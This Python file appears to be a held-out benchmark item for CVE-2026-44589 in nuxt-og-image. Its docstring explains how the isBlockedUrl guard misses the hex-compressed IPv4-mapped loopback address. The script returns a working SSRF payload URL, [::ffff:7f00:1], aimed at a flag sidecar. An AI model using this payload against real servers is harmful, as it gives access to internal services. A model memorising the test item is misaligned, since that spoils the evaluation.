#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-44589 residual exploit for the nuxt-og-image isBlockedUrl guard.

The 6.2.5 (GHSA-pqhr-mp3f-hrpp) isBlockedUrl() only maps DOTTED IPv4-mapped IPv6 to a
private-IPv4 check (RE_MAPPED_V4 = /^::ffff:(\\d+\\.\\d+\\.\\d+\\.\\d+)$/) and otherwise blocks
IPv6 only where bare === "::1" || startsWith("fc"|"fd"|"fe80"). The HEX-compressed
IPv4-mapped loopback [::ffff:7f00:1] (== ::ffff:127.0.0.1, reaches 127.0.0.1) is not dotted
(RE_MAPPED_V4 misses) and matches none of ::1/fc/fd/fe80 -> ALLOWED on V1 -> the module
server-fetches loopback and reaches the ${PCB_FLAG} sidecar (residual bypass). WHATWG URL
normalizes even the dotted spelling [::ffff:127.0.0.1] to the hex form, so both spell the gap.

CVE-2026-44589 (fixed in 6.4.9) rewrites isBlockedUrl with full IPv6 expansion
(expandIPv6 -> isPrivateIPv6), which maps ::ffff:7f00:1 to 127.x -> private -> BLOCKED on V2.
"""


def candidate():
    return {
        "avatar": "http://[::ffff:7f00:1]:9111/",
        "probe_id": "residual-cve-2026-44589-hex-ipv4mapped-loopback",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
